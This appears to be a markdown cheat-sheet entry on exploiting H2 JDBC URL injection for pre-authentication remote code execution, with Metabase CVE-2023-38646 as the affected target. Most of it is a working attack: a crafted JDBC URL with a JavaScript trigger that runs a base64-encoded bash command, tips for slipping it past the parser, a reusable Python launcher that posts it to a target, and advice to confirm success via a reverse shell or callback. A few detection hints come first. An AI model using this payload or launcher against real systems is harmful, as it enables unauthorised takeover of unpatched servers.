# H2 JDBC URL → JavaScript Trigger RCE

Apps that pass attacker-controlled JDBC URL to `org.h2.Driver` (BI tools, "test connection" wizards, no-code DB validators) → pre-auth RCE because H2 supports embedded JS triggers.

Split from [sql-injection-advanced.md](sql-injection-advanced.md), which keeps the other advanced SQLi techniques (RCE via `load_extension`, blind flag extraction, MSSQL linked-server lateral movement).

**Detection:**
- "Validate database / test connection" endpoints accepting freeform JDBC URL or `engine=h2`.
- `org.h2`/`h2-*.jar`/`h2.jar` in stack traces.
- Setup / first-run wizard endpoints accepting connection details before auth.

**Working JDBC URL (H2 v2.x):**
```
zip:/app/<app>.jar!/sample-database.db;TRACE_LEVEL_SYSTEM_OUT=0\;CREATE TRIGGER <RAND> BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript
java.lang.Runtime.getRuntime().exec('bash -c {echo,<B64_CMD>}|{base64,-d}|{bash,-i}')
$$--=x
```

**Critical gotchas:**
1. JS body MUST use single-string `Runtime.getRuntime().exec(...)`. `new String[]{...}` introduces `,{}` characters that break H2's SQL parser BEFORE the trigger source.
2. Single-string form splits on whitespace — use bash brace expansion `{echo,<b64>}|{base64,-d}|{bash,-i}` to ship multi-arg command without spaces.
3. Trigger names MUST be unique per request — randomize: `''.join(random.choice(string.ascii_uppercase) for _ in range(12))`.
4. B64 padding leaks into JSON/URL. Pad cleartext until b64 has no trailing `=`.
5. Lower layer parses trigger source as SQL, bails out, but trigger HAS FIRED. HTTP response is **misleading**: 400 with "Syntax error" is SUCCESS — verify only via reverse shell / HTTP callback, never response body.
6. Use `$$...$$` delimiters around JS body. Real `\n` between `//javascript` and JS — do NOT URL-encode.

**Reusable Python launcher:**
```python
import base64, random, string, requests
def h2_trigger_rce(target_url, jdbc_field, command, extra=None):
    enc = base64.b64encode(command.encode()).decode()
    while enc.endswith('='):
        command += ' '
        enc = base64.b64encode(command.encode()).decode()
    rand = ''.join(random.choice(string.ascii_uppercase) for _ in range(12))
    db = (f"zip:/app/x.jar!/sample-database.db;TRACE_LEVEL_SYSTEM_OUT=0\\;"
          f"CREATE TRIGGER {rand} BEFORE SELECT ON INFORMATION_SCHEMA.TABLES "
          f"AS $$//javascript\n"
          f"java.lang.Runtime.getRuntime().exec('bash -c {{echo,{enc}}}"
          f"|{{base64,-d}}|{{bash,-i}}')\n$$--=x")
    payload = {**(extra or {}), jdbc_field: {"db":db,"advanced-options":False,"ssl":True}}
    return requests.post(target_url, json=payload, timeout=30)
```

**Affected:** Metabase < 0.46.6.1 (CVE-2023-38646) — `/api/setup/validate`. Any H2-backed admin endpoint with freeform JDBC URL.
